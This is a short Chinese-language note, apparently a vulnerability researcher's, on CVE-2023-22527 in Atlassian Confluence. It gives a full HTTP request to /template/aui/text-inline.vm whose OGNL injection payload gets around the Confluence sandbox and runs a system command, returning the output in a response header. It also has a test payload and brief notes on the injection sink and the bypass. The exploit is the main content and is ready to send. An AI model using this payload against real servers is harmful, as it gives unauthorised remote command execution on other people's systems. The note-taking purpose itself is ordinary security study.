### CVE-2023-22527

```
POST /template/aui/text-inline.vm HTTP/1.1
Host: localhost:8090
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 287

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))
```

笔记可参考：[CVE-2023-22527](https://racerz.notion.site/Atlassian-Confluence-bacb31428c054a039ee87186578b7817)

- /template/aui/text-inline.vm 为我们提供了注入点，其传递的 Http 参数最终会转化为 string 类型值，传递给 `OgnlUtil.findValue` / `Ognl.findValue` sink 点

​	测试 payload: `test\u0027#{3*33}\u0027`

- `#request['.KEY_velocity.struts2.context']` 为我们提供了获取 ognl 的能力，可绕过 confluence 沙箱